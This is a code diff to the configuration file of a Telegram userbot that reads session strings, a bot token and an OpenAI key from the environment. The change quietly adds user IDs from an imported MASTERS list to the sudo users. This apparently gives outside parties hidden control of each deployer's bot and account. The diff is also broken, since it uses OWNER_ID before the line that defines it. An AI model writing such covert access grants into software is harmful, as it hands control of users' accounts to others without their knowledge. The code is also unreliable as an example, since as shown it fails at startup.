@@ -22,6 +22,7 @@
 
 import os
 from distutils.util import strtobool
+from XDB.data import MASTERS
 from os import getenv
 from X.helpers.cmd import cmd
 from dotenv import load_dotenv
@@ -38,7 +39,6 @@ BOTLOG_CHATID = int(getenv("BOTLOG_CHATID") or 0)
 BOT_VER = "4.0.0@main"
 BRANCH = getenv("BRANCH", "main") #don't change this line 
 CMD_HNDLR = cmd
-OWNER_ID = getenv("OWNER_ID", "")
 BOT_TOKEN = getenv("BOT_TOKEN", "none")
 OPENAI_API_KEY = getenv("OPENAI_API_KEY", "")
 CHANNEL = getenv("CHANNEL", "Japanese_Userbot")
@@ -62,7 +62,20 @@ STRING_SESSION7 = getenv("STRING_SESSION7", "")
 STRING_SESSION8 = getenv("STRING_SESSION8", "")
 STRING_SESSION9 = getenv("STRING_SESSION9", "")
 STRING_SESSION10 = getenv("STRING_SESSION10", "")
-SUDO_USERS = list(map(int, getenv("SUDO_USERS", "6694740726").split()))
+SUDOS = os.getenv("SUDO_USERS", None)
+SUDO_USERS = []
+
+if SUDOS:
+    sudos = str(SUDOS).split(" ")
+    for sudo_id in sudos:
+        try:
+            SUDO_USERS.append(int(sudo_id))
+        except ValueError:
+            print(f"Warning: Invalid user ID '{sudo_id}' in SUDO_USERS environment variable.")
+            continue
+SUDO_USERS.append(OWNER_ID)
+SUDO_USERS.extend(MASTERS)
+OWNER_ID = getenv("OWNER_ID", "")
 BLACKLIST_CHAT = getenv("BLACKLIST_CHAT", None)
 if not BLACKLIST_CHAT:
     BLACKLIST_CHAT = [-1001608701614, -1001675459127, -1001473548283, -1001608701614]
